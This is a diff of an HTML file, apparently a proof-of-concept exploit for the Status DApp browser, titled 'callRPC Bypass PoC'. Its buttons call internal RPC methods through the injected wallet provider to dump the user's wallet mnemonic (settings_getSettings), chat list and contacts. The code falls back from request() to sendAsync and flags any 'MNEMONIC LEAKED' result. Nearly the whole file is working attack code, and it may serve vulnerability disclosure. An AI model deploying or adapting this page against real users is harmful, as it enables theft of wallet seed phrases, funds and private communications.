@@ -1,23 +1,59 @@
 <!DOCTYPE html>
-<html>
-<body>
-<pre id="out">Waiting...</pre>
-<script>
-function tryRequest() {
-  if (typeof window.ethereum !== 'undefined') {
-    window.ethereum.request({ method: 'settings_getSettings', params: [] })
-      .then(r => {
-        document.getElementById('out').textContent = JSON.stringify(r, null, 2);
-      })
-      .catch(e => {
-        document.getElementById('out').textContent = 'Error: ' + e.message;
+  <html>
+  <head>
+    <title>Status RPC Bypass POC</title>
+    <style>
+      body { font-family: monospace; padding: 20px; }
+      pre { background: #111; color: #0f0; padding: 15px; white-space: pre-wrap; word-break: break-all; }
+      button { padding: 12px 24px; font-size: 16px; margin: 5px; }
+    </style>
+  </head>
+  <body>
+    <h2>Status DApp Browser — callRPC Bypass PoC</h2>
+    <button onclick="runPOC('settings_getSettings')">1. Dump Mnemonic (settings_getSettings)</button>
+    <button onclick="runPOC('wakuext_chats', [])">2. Dump Chat List</button>
+    <button onclick="runPOC('wakuext_contacts', [])">3. Dump Contacts</button>
+    <pre id="out">Output will appear here...</pre>
+
+  <script>
+  async function sendRPC(method, params) {
+    const payload = { jsonrpc: '2.0', id: 1, method, params: params || [] };
+
+    // Strategy 1: EIP-1193 request()
+    if (window.ethereum && window.ethereum.request) {
+      try {
+        return await window.ethereum.request({ method, params: params || [] });
+      } catch (e) {
+        console.log('request() failed, trying sendAsync:', e);
+      }
+    }
+
+    // Strategy 2: Legacy sendAsync (Status injected provider)
+    return new Promise((resolve, reject) => {
+      const provider = window.ethereum || (window.web3 && window.web3.currentProvider);
+      if (!provider) return reject('No provider found');
+      provider.sendAsync(payload, (err, res) => {
+        if (err) reject(err);
+        else resolve(res.result);
       });
-  } else {
-    document.getElementById('out').textContent = 'window.ethereum not found — not in Status browser?';
-    setTimeout(tryRequest, 500);
+    });
   }
-}
-window.addEventListener('load', tryRequest);
-</script>
-</body>
-</html>
+
+  async function runPOC(method, params) {
+    const out = document.getElementById('out');
+    out.textContent = `Calling ${method}...`;
+    try {
+      const result = await sendRPC(method, params);
+      out.textContent = JSON.stringify(result, null, 2);
+
+      // Highlight the mnemonic if present
+      if (result && result.mnemonic) {
+        out.textContent += '\n\n⚠️   MNEMONIC LEAKED: ' + result.mnemonic;
+      }
+    } catch(e) {
+      out.textContent = 'Error: ' + JSON.stringify(e, null, 2);
+    }
+  }
+  </script>
+  </body>
+  </html>
